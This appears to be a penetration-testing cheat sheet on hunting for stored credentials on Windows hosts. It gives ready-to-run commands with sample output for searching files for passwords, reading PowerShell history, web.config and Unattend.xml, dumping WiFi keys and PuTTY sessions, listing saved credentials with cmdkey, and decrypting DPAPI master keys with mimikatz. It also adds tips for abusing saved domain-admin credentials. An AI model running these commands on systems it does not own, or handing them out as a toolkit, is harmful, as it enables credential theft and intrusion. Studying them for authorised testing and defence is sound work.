# CREDENTIAL HUNTING

### Search for passwords in files

Grep for password strings — Config files, notes, scripts

```bash
findstr /si "password" *.txt *.xml *.ini *.config *.cfg
findstr /si "password" C:\Users\*.*
```

<details>
<summary>Example Output</summary>

```
findstr /si "password" *.txt *.xml *.config
C:\inetpub\wwwroot\web.config:  connectionString="...Password=DBp@ss123..."
C:\Users\admin\Desktop\notes.txt: WiFi password: CompanyWifi2024!
```
</details>

---

### PowerShell history

Previous PS commands — May contain typed passwords

```bash
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

<details>
<summary>Example Output</summary>

```
type ConsoleHost_history.txt
Invoke-Command -ComputerName DC01 -Credential $cred
$password = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText
net user admin NewP@ss123 /domain
(Passwords in PS history)
```
</details>

---

### IIS web.config

Database connection strings — SQL credentials

```bash
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

<details>
<summary>Example Output</summary>

```
type C:\inetpub\wwwroot\web.config
<connectionStrings>
  <add connectionString="Server=localhost;Database=webapp;User Id=sa;Password=SQLp@ss2024!"/>
</connectionStrings>
```
</details>

---

### Unattend/sysprep files

Deployment passwords — Often base64 encoded

```bash
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep\Unattend.xml
```

<details>
<summary>Example Output</summary>

```
type C:\Windows\Panther\Unattend.xml
<AutoLogon>
  <Password>
    <Value>QWRtaW5AMTIz</Value>
  </Password>
  <Username>Administrator</Username>
</AutoLogon>

base64 -d: Admin@123
```
</details>

---

### WiFi passwords

Stored WiFi credentials — May match user passwords

```bash
netsh wlan show profiles
netsh wlan show profile name=<SSID> key=clear
```

<details>
<summary>Example Output</summary>

```
netsh wlan show profiles
  All User Profile : CorpWiFi

netsh wlan show profile name=CorpWiFi key=clear
  Key Content: CompanyWiFi2024!
(People often reuse WiFi password for accounts)
```
</details>

---

### PuTTY saved sessions

Stored SSH credentials — Proxy passwords

```bash
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```

<details>
<summary>Example Output</summary>

```
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
  HostName: 172.16.1.10
  UserName: admin
  ProxyPassword: Pr0xyP@ss!
(Saved SSH session credentials)
```
</details>

---

### Credential Manager

Windows Credential Manager — Stored creds for services

```bash
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr
```

<details>
<summary>Example Output</summary>

```
cmdkey /list
Target: Domain:interactive=CORP\administrator
Type: Domain Password
User: CORP\administrator
(Saved domain admin creds! Use with runas /savecred)
```
</details>

---

### DPAPI master keys

Encrypted credential storage — Decrypt with mimikatz if admin

```bash
dir C:\Users\<user>\AppData\Roaming\Microsoft\Protect\
```

<details>
<summary>Example Output</summary>

```
dir C:\Users\admin\AppData\Roaming\Microsoft\Protect\
  S-1-5-21-...
  (Master key files found)

With admin access:
mimikatz# dpapi::masterkey /in:masterkey /rpc
(Decrypt Chrome passwords, saved creds)
```
</details>

---
